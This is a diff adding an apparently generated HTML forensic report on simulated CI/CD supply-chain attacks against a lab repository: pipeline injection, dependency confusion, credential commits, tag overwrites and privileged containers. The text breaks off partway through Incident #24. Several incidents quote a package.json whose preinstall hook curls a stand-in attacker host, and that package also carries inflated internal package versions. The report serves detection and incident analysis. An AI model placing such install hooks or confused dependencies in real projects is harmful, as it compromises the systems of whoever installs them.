@@ -1,0 +1,1140 @@
+
+        <html>
+        <head>
+            <title>DPFF Forensic Report</title>
+            <style>
+                body { font-family: Arial, sans-serif; margin: 40px; }
+                h1 { color: #2c3e50; }
+                .incident { border: 1px solid #e74c3c; padding: 15px; margin-bottom: 20px; border-radius: 5px; }
+                .incident h3 { margin-top: 0; color: #c0392b; }
+                .severity { display: inline-block; padding: 2px 8px; border-radius: 3px; color: white; font-size: 12px; }
+                .severity-CRITICAL { background-color: #e74c3c; }
+                .severity-HIGH { background-color: #e67e22; }
+                .severity-MEDIUM { background-color: #f1c40f; color: #333; }
+                .severity-LOW { background-color: #27ae60; }
+                table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+                th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+                th { background-color: #f2f2f2; }
+                .hash { font-family: monospace; font-size: 11px; color: #7f8c8d; }
+            </style>
+        </head>
+        <body>
+            <h1>DPFF Forensic Investigation Report</h1>
+            <p>Generated on: 2026-02-19T13:31:34.002996</p>
+            <h2>Findings (28 Incidents Detected)</h2>
+        
+            <div class="incident">
+                <h3>Incident #1: Pipeline Injection Detected: Suspicious command found in build logs matching 2 exfiltration indicator(s).</h3>
+                <p><span class="severity severity-CRITICAL">CRITICAL</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 05:53:57</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions
+, Files: package.json
+[Content of package.json]:
+{
+  "name": "dpff-sample-app",
+  "version": "1.0.0",
+  "description": "Sample CI/CD target app",
+  "main": "app.js",
+  "scripts": {
+    "start": "node app.js",
+    "test": "echo \"Tests passed\" && exit 0",
+    "preinstall": "curl http://attacker.evil.com/callback"
+  },
+  "dependencies": {
+    "internal-utils": "99.0.0",
+    "internal-auth-sdk": "102.3.1"
+  }
+}
+</td>
+                        <td class="hash">6871112a44569e80...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #2: Pipeline Injection Detected: Suspicious command found in build logs matching 2 exfiltration indicator(s).</h3>
+                <p><span class="severity severity-CRITICAL">CRITICAL</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 06:09:09</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions
+, Files: package.json
+[Content of package.json]:
+{
+  "name": "dpff-sample-app",
+  "version": "1.0.0",
+  "description": "Sample CI/CD target app",
+  "main": "app.js",
+  "scripts": {
+    "start": "node app.js",
+    "test": "echo \"Tests passed\" && exit 0",
+    "preinstall": "curl http://attacker.evil.com/callback"
+  },
+  "dependencies": {
+    "internal-utils": "99.0.0",
+    "internal-auth-sdk": "102.3.1"
+  }
+}
+</td>
+                        <td class="hash">d8887b1295a954f8...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #3: Credential Theft Suspected: Flagged author detected in GitHub.</h3>
+                <p><span class="severity severity-HIGH">HIGH</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 05:47:57</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Add deployment key
+, Files: credentials/id_rsa</td>
+                        <td class="hash">f33202554969d708...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #4: Credential Theft Suspected: Flagged author detected in GitHub.</h3>
+                <p><span class="severity severity-HIGH">HIGH</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 05:48:12</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config
+, Files: </td>
+                        <td class="hash">017d0142c1f1141e...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #5: Credential Theft Suspected: Flagged author detected in GitHub.</h3>
+                <p><span class="severity severity-HIGH">HIGH</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 05:53:55</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config
+, Files: </td>
+                        <td class="hash">175bc231c76a0064...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #6: Credential Theft Suspected: Flagged author detected in GitHub.</h3>
+                <p><span class="severity severity-HIGH">HIGH</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 05:53:57</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions
+, Files: package.json
+[Content of package.json]:
+{
+  "name": "dpff-sample-app",
+  "version": "1.0.0",
+  "description": "Sample CI/CD target app",
+  "main": "app.js",
+  "scripts": {
+    "start": "node app.js",
+    "test": "echo \"Tests passed\" && exit 0",
+    "preinstall": "curl http://attacker.evil.com/callback"
+  },
+  "dependencies": {
+    "internal-utils": "99.0.0",
+    "internal-auth-sdk": "102.3.1"
+  }
+}
+</td>
+                        <td class="hash">6871112a44569e80...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #7: Credential Theft Suspected: Flagged author detected in GitHub.</h3>
+                <p><span class="severity severity-HIGH">HIGH</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 05:54:10</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config
+, Files: </td>
+                        <td class="hash">e82f6e0532f4a611...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #8: Credential Theft Suspected: Flagged author detected in GitHub.</h3>
+                <p><span class="severity severity-HIGH">HIGH</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 06:09:07</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config
+, Files: </td>
+                        <td class="hash">d922161168e3a8c6...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #9: Credential Theft Suspected: Flagged author detected in GitHub.</h3>
+                <p><span class="severity severity-HIGH">HIGH</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 06:09:09</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions
+, Files: package.json
+[Content of package.json]:
+{
+  "name": "dpff-sample-app",
+  "version": "1.0.0",
+  "description": "Sample CI/CD target app",
+  "main": "app.js",
+  "scripts": {
+    "start": "node app.js",
+    "test": "echo \"Tests passed\" && exit 0",
+    "preinstall": "curl http://attacker.evil.com/callback"
+  },
+  "dependencies": {
+    "internal-utils": "99.0.0",
+    "internal-auth-sdk": "102.3.1"
+  }
+}
+</td>
+                        <td class="hash">d8887b1295a954f8...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #10: Credential Theft Suspected: Flagged author detected in GitHub.</h3>
+                <p><span class="severity severity-HIGH">HIGH</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 06:09:21</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config
+, Files: </td>
+                        <td class="hash">a30c1956eae57093...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #11: Credential Theft Suspected: Flagged author detected in GitHub.</h3>
+                <p><span class="severity severity-HIGH">HIGH</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 06:12:22</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config
+, Files: </td>
+                        <td class="hash">d4c071a9a5725c2a...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #12: Credential Theft Suspected: Flagged author detected in GitHub.</h3>
+                <p><span class="severity severity-HIGH">HIGH</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 06:12:41</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config
+, Files: </td>
+                        <td class="hash">df5c730dbb0e7d69...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #13: Dependency Confusion Detected: Internal package pulled from public registry with suspicious version pattern.</h3>
+                <p><span class="severity severity-CRITICAL">CRITICAL</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 05:53:57</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions
+, Files: package.json
+[Content of package.json]:
+{
+  "name": "dpff-sample-app",
+  "version": "1.0.0",
+  "description": "Sample CI/CD target app",
+  "main": "app.js",
+  "scripts": {
+    "start": "node app.js",
+    "test": "echo \"Tests passed\" && exit 0",
+    "preinstall": "curl http://attacker.evil.com/callback"
+  },
+  "dependencies": {
+    "internal-utils": "99.0.0",
+    "internal-auth-sdk": "102.3.1"
+  }
+}
+</td>
+                        <td class="hash">6871112a44569e80...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #14: Dependency Confusion Detected: Internal package pulled from public registry with suspicious version pattern.</h3>
+                <p><span class="severity severity-CRITICAL">CRITICAL</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 06:09:09</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions
+, Files: package.json
+[Content of package.json]:
+{
+  "name": "dpff-sample-app",
+  "version": "1.0.0",
+  "description": "Sample CI/CD target app",
+  "main": "app.js",
+  "scripts": {
+    "start": "node app.js",
+    "test": "echo \"Tests passed\" && exit 0",
+    "preinstall": "curl http://attacker.evil.com/callback"
+  },
+  "dependencies": {
+    "internal-utils": "99.0.0",
+    "internal-auth-sdk": "102.3.1"
+  }
+}
+</td>
+                        <td class="hash">d8887b1295a954f8...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #15: Artifact Tampering Suspected: Tag 'localhost:5000/dpff-sample-app' was overwritten 16 times. (Registry did not provide digests).</h3>
+                <p><span class="severity severity-HIGH">HIGH</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 05:33:45.842643</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">d37a216e6204e466...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 05:33:49.567636</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">28b2e7cd4acf748c...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 05:34:10.576396</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">9d7b05894a37d263...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 05:34:13.879790</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">e2c5d59b1cfa24ed...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 05:40:00.798136</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">e5c497504eda7696...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 05:40:04.022093</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">7116bd0f039d5d8b...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 05:40:16.826126</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">ab9e433d74e44e12...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 05:40:20.123902</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">0851e21968aa2a43...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 05:43:51.576552</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">badeef889294772b...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 05:43:55.065284</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">1073330525319bda...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 05:44:08.106554</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">b60184606b09e536...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 05:44:11.220015</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">9ca006ebfb035853...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:29.646569</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">264b943b638cf10e...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:32.038065</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">478cdb19ec008d2c...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:47.243840</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">a63499e6b680c05c...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:49.485927</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">94f6569177cf1e32...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #16: Obfuscated Command Detected: 1 encoding/evasion indicator(s) found in pipeline step.</h3>
+                <p><span class="severity severity-HIGH">HIGH</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 11:24:10.793000</td>
+                        <td>Jenkins</td>
+                        <td>Step Execution</td>
+                        <td>Job: dpff-attack-05-obfuscation, Line 17: + base64 -d</td>
+                        <td class="hash">2368a5bfd38db657...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #17: Privileged Container Detected: Pod deployed with dangerous security config (privileged, hostNetwork, hostPID).</h3>
+                <p><span class="severity severity-CRITICAL">CRITICAL</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 06:12:38</td>
+                        <td>Docker</td>
+                        <td>Container Audit</td>
+                        <td>Container: dpff-attack-06-privileged, Image: alpine:latest, Status: exited [PRIVILEGED: privileged=true, hostNetwork=true, hostPID=true]</td>
+                        <td class="hash">4eef91280454a26f...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #18: Privileged Container Detected: Pod deployed with dangerous security config (hostNetwork).</h3>
+                <p><span class="severity severity-CRITICAL">CRITICAL</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 06:12:39</td>
+                        <td>Docker</td>
+                        <td>Container Audit</td>
+                        <td>Container: dpff-attack-06-hostnet, Image: alpine:latest, Status: exited [PRIVILEGED: hostNetwork=true]</td>
+                        <td class="hash">88e037ef22e1829a...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #19: Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.</h3>
+                <p><span class="severity severity-CRITICAL">CRITICAL</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 05:47:57</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Add deployment key
+, Files: credentials/id_rsa</td>
+                        <td class="hash">f33202554969d708...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:29.646569</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">264b943b638cf10e...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:32.038065</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">478cdb19ec008d2c...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #20: Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.</h3>
+                <p><span class="severity severity-CRITICAL">CRITICAL</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 05:48:12</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config
+, Files: </td>
+                        <td class="hash">017d0142c1f1141e...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:29.646569</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">264b943b638cf10e...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:32.038065</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">478cdb19ec008d2c...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #21: Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.</h3>
+                <p><span class="severity severity-CRITICAL">CRITICAL</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 05:53:55</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config
+, Files: </td>
+                        <td class="hash">175bc231c76a0064...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:29.646569</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">264b943b638cf10e...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:32.038065</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">478cdb19ec008d2c...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #22: Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.</h3>
+                <p><span class="severity severity-CRITICAL">CRITICAL</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 05:53:57</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions
+, Files: package.json
+[Content of package.json]:
+{
+  "name": "dpff-sample-app",
+  "version": "1.0.0",
+  "description": "Sample CI/CD target app",
+  "main": "app.js",
+  "scripts": {
+    "start": "node app.js",
+    "test": "echo \"Tests passed\" && exit 0",
+    "preinstall": "curl http://attacker.evil.com/callback"
+  },
+  "dependencies": {
+    "internal-utils": "99.0.0",
+    "internal-auth-sdk": "102.3.1"
+  }
+}
+</td>
+                        <td class="hash">6871112a44569e80...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:29.646569</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">264b943b638cf10e...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:32.038065</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">478cdb19ec008d2c...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #23: Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.</h3>
+                <p><span class="severity severity-CRITICAL">CRITICAL</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 05:54:10</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config
+, Files: </td>
+                        <td class="hash">e82f6e0532f4a611...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:29.646569</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">264b943b638cf10e...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:32.038065</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">478cdb19ec008d2c...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #24: Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.</h3>
+                <p><span class="severity severity-CRITICAL">CRITICAL</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 06:09:07</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config
+, Files: </td>
+                        <td class="hash">d922161168e3a8c6...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:29.646569</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
